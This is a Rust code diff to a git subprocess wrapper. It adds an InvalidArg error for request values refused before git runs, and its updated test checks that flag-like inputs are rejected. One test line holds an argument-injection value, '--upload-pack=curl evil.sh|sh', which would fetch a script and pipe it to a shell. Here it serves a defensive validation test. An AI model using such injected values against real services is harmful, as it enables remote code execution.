@@ -33,9 +33,16 @@ pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(30);
 pub enum GitError {
     /// The invocation exceeded its cap and the child was killed.
     Timeout,
-    /// git could not be spawned at all — not on PATH, or the repo path is
-    /// unusable. Distinct from a nonzero exit, which is an ordinary answer.
+    /// git ran and failed — either it could not be spawned at all (not on
+    /// PATH, an unusable repo path) or it exited nonzero (`require_ok`'s
+    /// case). The two are not distinguished because no caller has yet needed
+    /// to tell them apart.
     Failed(String),
+    /// A request-derived value was refused before any subprocess ran.
+    /// Distinct from `Failed` because it is the CALLER's input that was
+    /// wrong, not git — a route turns this into 400 and the others into 500,
+    /// and string-matching a message to tell them apart is not a seam.
+    InvalidArg(String),
 }
 
 #[derive(Debug, Clone)]
@@ -515,7 +522,7 @@ pub async fn pull_ff(repo: &Path, timeout: Duration) -> Result<(), GitError> {
 /// either: this is the rule, and `--` is what makes forgetting it survivable.
 pub fn validate_arg(value: &str) -> Result<(), GitError> {
     if value.starts_with('-') {
-        return Err(GitError::Failed(format!(
+        return Err(GitError::InvalidArg(format!(
             "refusing a value that git would read as a flag: {value:?}"
         )));
     }
@@ -769,7 +776,7 @@ mod tests {
         assert!(validate_arg("main").is_ok());
         assert!(validate_arg("feat/x").is_ok());
         assert!(validate_arg("--upload-pack=curl evil.sh|sh").is_err());
-        assert!(validate_arg("-c").is_err());
+        assert!(matches!(validate_arg("-c"), Err(GitError::InvalidArg(_))));
     }
 
     #[tokio::test]
